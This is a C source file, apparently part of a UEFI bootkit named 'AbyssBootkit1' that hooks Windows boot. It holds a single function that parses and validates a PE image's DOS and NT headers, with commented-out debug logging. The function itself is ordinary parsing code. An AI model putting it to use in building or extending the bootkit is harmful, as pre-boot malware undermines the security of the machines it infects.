// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Utils Headers
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils03Memory.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures01PortableExecutable.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Retrieves the NT headers of a PE (Portable Executable) file.
	@details        This function extracts and returns the NT headers structure from a PE file, which contains essential information about the file's format and characteristics.


	@param[in]      Base                        A pointer to the base address of the PE file.
	@param[in]      Size                        (Optional) The size, in bytes, of the PE file.


	@retval         PEFI_IMAGE_NT_HEADERS       A pointer to the EFI_IMAGE_NT_HEADERS structure if found; otherwise, NULL.
**/
PEFI_IMAGE_NT_HEADERS
BootWindowsHookings_UtilsHeaders_GetNTHeadersPEFile(
	IN              CONST VOID*                 Base,
	IN              UINTN                       Size OPTIONAL
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	CONST BOOLEAN RangeCheck = Size > 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if size is less than the size of EFI_IMAGE_DOS_HEADER
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check if size is less than the size of EFI_IMAGE_DOS_HEADER\r\n");

	// Failed
	if (RangeCheck && Size < sizeof(EFI_IMAGE_DOS_HEADER))
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check [Check if size is less than the size of EFI_IMAGE_DOS_HEADER].\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if e_magic field not match expected DOS signature
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check if size is less than the size of EFI_IMAGE_DOS_HEADER\r\n");

	// Failed
	if (((PEFI_IMAGE_DOS_HEADER)Base)->e_magic != EFI_IMAGE_DOS_SIGNATURE)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check [Check if e_magic field not match expected DOS signature].\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Extract e_lfanew field from DOS header
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Extract e_lfanew field from DOS header\r\n");

	CONST UINT32 e_lfanew = ((PEFI_IMAGE_DOS_HEADER)Base)->e_lfanew;


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if e_lfanew field is not within valid bounds
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check if e_lfanew field is not within valid bounds\r\n");

	// Failed
	if (RangeCheck && (e_lfanew >= Size || e_lfanew >= (MAX_UINT32 - sizeof(EFI_IMAGE_NT_SIGNATURE) - sizeof(EFI_IMAGE_FILE_HEADER)) || e_lfanew + sizeof(EFI_IMAGE_NT_SIGNATURE) + sizeof(EFI_IMAGE_FILE_HEADER) >= Size))
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check [Check if e_lfanew field is not within valid bounds].\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get NT headers address
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Get NT headers address\r\n");

	CONST PEFI_IMAGE_NT_HEADERS NtHeaders = (PEFI_IMAGE_NT_HEADERS)(((UINT8*)Base) + e_lfanew);


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if NtHeaders address is not canonical
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check if NtHeaders address is not canonical\r\n");

	// Failed
	if (!BootWindowsHookings_UtilsMemory_IsAddressCanonical((UINTN)NtHeaders))
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check [Check if NtHeaders address is not canonical].\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if NT headers signature field not match expected NT signature
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check if NT headers signature field not match expected NT signature\r\n");

	// Failed
	if (NtHeaders->Signature != EFI_IMAGE_NT_SIGNATURE)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Check [Check if NT headers signature field not match expected NT signature].\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Headers.c] (GetNTHeadersPEFile) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return NtHeaders;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
